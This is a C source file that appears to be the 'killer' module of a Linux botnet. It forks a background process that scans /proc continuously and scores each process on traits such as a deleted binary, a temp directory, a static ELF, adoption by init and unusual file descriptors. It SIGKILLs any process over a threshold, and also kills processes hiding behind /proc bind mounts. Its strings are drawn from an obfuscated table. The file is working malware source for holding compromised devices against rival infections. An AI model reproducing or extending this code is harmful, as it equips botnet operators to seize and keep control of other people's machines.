#include <ctype.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/limits.h>
#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include <sys/poll.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <time.h>
#include <unistd.h>

#include "bot/config/table.h"
#include "bot/definitions.h"
#include "bot/modules/killer.h"
#include "bot/utils/elf.h"
#include "bot/utils/string.h"
#include "bot/utils/tokenizer.h"

#define BUF_SIZE 512

typedef struct _node {
  pid_t pid;
  struct _node *next;
} node_t, *pnode_t;

static pnode_t cache = NULL;
static time_t last_scan = 0;
static pid_t killer_pid = -1;
process_info_t init_proc = {};
char self_path[BUF_SIZE] = {0};

static inline void killer_cache_insert(pid_t pid) {
  pnode_t node = malloc(sizeof(node_t));

  node->pid = pid;
  node->next = cache;

  cache = node;
}

static inline void killer_cache_clear() {
  for (pnode_t current = cache; current != NULL;) {
    pnode_t next = current->next;
    free(current);
    current = next;
  }

  cache = NULL;
}

static inline bool killer_cache_exists(pid_t pid) {
  for (pnode_t node = cache; node != NULL; node = node->next)
    if (node->pid == pid) return true;
  return false;
}

bool killer_retrieve_ppid(char *pid, pprocess_info_t info) {
  char path[BUF_SIZE] = {0};
  char buffer[BUF_SIZE] = {0};

  strcpy(path, table_retrieve(TABLE_KILLER_PROC, NULL));
  strcat(path, pid);
  strcat(path, table_retrieve(TABLE_KILLER_STATUS, NULL));
  path[strlen(path)] = '\0';

  // open status
  int fd = open(path, O_RDONLY);
  if (fd < 0) return false;

  // read in 4096 bytes (should be enough for PPid), then null term
  size_t n = read(fd, buffer, sizeof(buffer) - 1);
  close(fd);
  if (n <= 0) return false;
  buffer[n] = '\0';

  // search PPid
  char *line = strstr(buffer, table_retrieve(TABLE_KILLER_PPID, NULL));
  if (!line) return false;

  // advance buf, skip new space
  line += 5;
  line += strspn(line, " \t");
  info->ppid = atoi(line);
  return true;
}

static inline bool killer_retrieve_path(char *pid, pprocess_info_t info) {
  char path[BUF_SIZE] = {0};
  char buffer[BUF_SIZE] = {0};

  strcpy(path, table_retrieve(TABLE_KILLER_PROC, NULL));
  strcat(path, pid);
  strcat(path, table_retrieve(TABLE_KILLER_EXE, NULL));
  path[strlen(path)] = '\0';

  int n = readlink(path, buffer, BUF_SIZE - 1);
  if (n <= 0) return false;
  buffer[n] = '\0';
  strncpy(info->exe_path, buffer, n);

  // check if its deleted, if yes set deleted flag to true
  if (strstr(info->exe_path, table_retrieve(TABLE_KILLER_DELETED, NULL)) != NULL) {
    info->flags |= FLAG_DELETED;
  }

  // check if the ELF is static, if yes set static flag to true
  if (elf_is_static(buffer)) {
    info->flags |= FLAG_STATIC;
  }

  // check if its in a temp directory
  ptokenizer_t tokenizer = tokenizer_new(table_retrieve(TABLE_KILLER_TMP, NULL), ",");
  if (tokenizer) {
    // go through all tokens
    for (int i = 0; i < tokenizer->size; i++) {
      char *token = tokenizer->tokens[i];
      if (str_search(buffer, token, n, strlen(token)) > 0) {
        info->flags |= FLAG_TEMP_DIR;
      }
    }

    tokenizer_free(tokenizer);
  }

  // only get directory and copy it into proc info structure
  char *last_slash = strrchr(buffer, '/');
  if (last_slash) {
    last_slash[1] = '\0';
    strncpy(info->directory, buffer, strlen(buffer));
  }

  return true;
}

void killer_retrieve_cmdline(char *pid, pprocess_info_t info) {
  char path[BUF_SIZE] = {0};
  strcpy(path, table_retrieve(TABLE_KILLER_PROC, NULL));
  strcat(path, pid);
  strcat(path, table_retrieve(TABLE_KILLER_CMDLINE, NULL));
  path[strlen(path)] = '\0';

  int fd = open(path, O_RDONLY);
  if (fd == -1) return;

  ssize_t n_bytes = read(fd, info->cmdline, sizeof(info->cmdline));
  info->cmdline_len = n_bytes;
  close(fd);
}

static inline bool killer_has_invalid_cmdline(pprocess_info_t info) {
  char *base_name = strrchr(info->exe_path, '/');
  if (base_name == NULL) return false;
  base_name++;
  return str_search(info->cmdline, base_name, info->cmdline_len, strlen(base_name)) == -1;
}

static inline bool killer_has_any_fd(char *pid) {
  char path[BUF_SIZE] = {0};

  strcpy(path, table_retrieve(TABLE_KILLER_PROC, NULL));
  strcat(path, pid);
  strcat(path, table_retrieve(TABLE_KILLER_FD, NULL));

  DIR *dir = opendir(path);
  if (!dir) return false;

  struct dirent *entry;
  bool has_files = false;

  // yeah thos probably has a fd
  while ((entry = readdir(dir)) != NULL) {
    if (isdigit(*entry->d_name)) {
      has_files = true;
    }
  }

  closedir(dir);
  return has_files;
}

static inline bool killer_check_fd(char *pid) {
  char path[BUF_SIZE] = {0};
  char buffer[BUF_SIZE] = {0};
  bool found = false;

  // if it has no fds, just skip lmao
  if (!killer_has_any_fd(pid)) return false;

  for (int i = 0; i < 2; i++) {
    path[0] = '\0';

    strcpy(path, table_retrieve(TABLE_KILLER_PROC, NULL));
    strcat(path, pid);
    strcat(path, table_retrieve(TABLE_KILLER_FD, NULL));
    strcat(path, "/");
    strcat(path, i == 0 ? "0" : "1");

    // Read symlink
    errno = 0;
    int n = readlink(path, buffer, BUF_SIZE - 1);
    if (n <= 0 && errno != ENOENT) continue;
    buffer[n] = '\0';

    // high possibility its legit
    if (strncmp(buffer, table_retrieve(TABLE_KILLER_DEV, NULL), 5) == 0) {
      return false;
    }

    // bleh
    found = true;
    break;
  }

  return found;
}

// retrieve all info including cmdline
static inline bool killer_retrieve_info(char *pid, pprocess_info_t info) {
  killer_retrieve_cmdline(pid, info);
  return killer_retrieve_ppid(pid, info) && killer_retrieve_path(pid, info);
}

void killer_check_proc(bool cache) {
  if (cache) {
    killer_cache_clear();
    last_scan = time(NULL);
  }

  // open proc dir
  DIR *dir = opendir(table_retrieve(TABLE_KILLER_PROC, NULL));
  if (!dir) return;

  // scan proc
  struct dirent *entry;
  while ((entry = readdir(dir)) != NULL) {
    if (!isdigit(*entry->d_name)) continue;

    pid_t pid = atoi(entry->d_name);
    if (killer_cache_exists(pid)) continue;

    // retrieve info on process
    process_info_t proc = {};
    memset(&proc, '\0', sizeof(process_info_t));

    if (!killer_retrieve_info(entry->d_name, &proc)) {
      continue;
    }

    if (strcmp(proc.exe_path, self_path) == 0) {
      continue;
    }

    // check if the file is deleted
    if (proc.flags & FLAG_DELETED) {
      proc.vl++;

      LOG_TRACE("['%s' / '%s'] failed FLAG_DELETED (vl: %d)", entry->d_name, proc.exe_path,
                proc.vl);
    }

    // check if the file was in a temp dir
    if (proc.flags & FLAG_TEMP_DIR) {
      proc.vl++;

      LOG_TRACE("['%s' / '%s'] failed FLAG_TEMP_DIR (vl: %d)", entry->d_name, proc.exe_path,
                proc.vl);
    }

    // check if the file is static
    if (proc.flags & FLAG_STATIC) {
      proc.vl++;

      LOG_TRACE("['%s' / '%s'] failed FLAG_STATIC (vl: %d)", entry->d_name, proc.exe_path, proc.vl);
    }

    // check if we have ppid, check if the directories match
    if (geteuid() == 0 && proc.ppid == 1 &&
        strncmp(proc.directory, init_proc.directory, strlen(init_proc.directory)) != 0) {
      proc.vl++;

      LOG_TRACE("['%s' / '%s'] failed ADOPTED_CHILD (vl: %d)", entry->d_name, proc.exe_path,
                proc.vl);
    }

    // checks if the first two fds are /dev/null..bla bla
    if (killer_check_fd(entry->d_name)) {
      proc.vl++;

      LOG_TRACE("['%s' / '%s'] failed FD (vl: %d)", entry->d_name, proc.exe_path, proc.vl);
    }

    if (killer_has_invalid_cmdline(&proc)) {
      proc.vl++;

      LOG_TRACE("['%s' / '%s'] failed NAME_MISMATCH (vl: %d)", entry->d_name, proc.exe_path,
                proc.vl);
    }

    if (proc.vl >= KILLER_VL_THRESHOLD) {
      LOG_WARN("Process ['%s'] terminated. (exe_path: %s, "
               "cmdline: %s, score: %d)",
               entry->d_name, proc.exe_path, proc.cmdline, proc.vl);
      kill(atoi(entry->d_name), 9);
      continue;
    }

    if (cache) killer_cache_insert(pid);
  }

  closedir(dir);
}

void killer_init() {
  if ((killer_pid = fork()) <= 0) {
    return;
  }

  // can't read own path, bail
  size_t n = readlink(table_retrieve(TABLE_KILLER_SELF_EXE, NULL), self_path, sizeof(self_path));
  if (n <= 0) exit(0);

  // retireve info on the init proc
  memset(&init_proc, '\0', sizeof(process_info_t));
  killer_retrieve_info("1", &init_proc);

  // first iteration, then check every 80ms
  killer_check_proc(true);

  while (true) {
    killer_check_proc(time(NULL) - last_scan >= 10);
    usleep(50 * 1000);
  }
}

void killer_kill() {
  if (killer_pid == -1) return;

  kill(killer_pid, 9);
  killer_pid = -1;
}

void killer_clean_mnt() {
  int fd = open(table_retrieve(TABLE_KILLER_MOUNTS, NULL), O_RDONLY);
  if (fd < 0) return;

  char buffer[4096] = {0};

  while (str_fdgets(buffer, sizeof(buffer), fd, NULL) != NULL) {
    char *proc_entry = strstr(buffer, table_retrieve(TABLE_KILLER_PROC, NULL));
    if (!proc_entry) continue;

    /**
     * advance 6 chars (skip /proc/)
     * then null term string at space
     * and skip anything that is NOT a digit
     */
    proc_entry += 6;
    proc_entry[strcspn(proc_entry, " ")] = '\0';
    if (!isdigit(*proc_entry)) continue;

    LOG_INFO("Process ['%s'] has violated mounts check, killing", proc_entry);
    kill(atoi(proc_entry), 9);
  }

  close(fd);
}
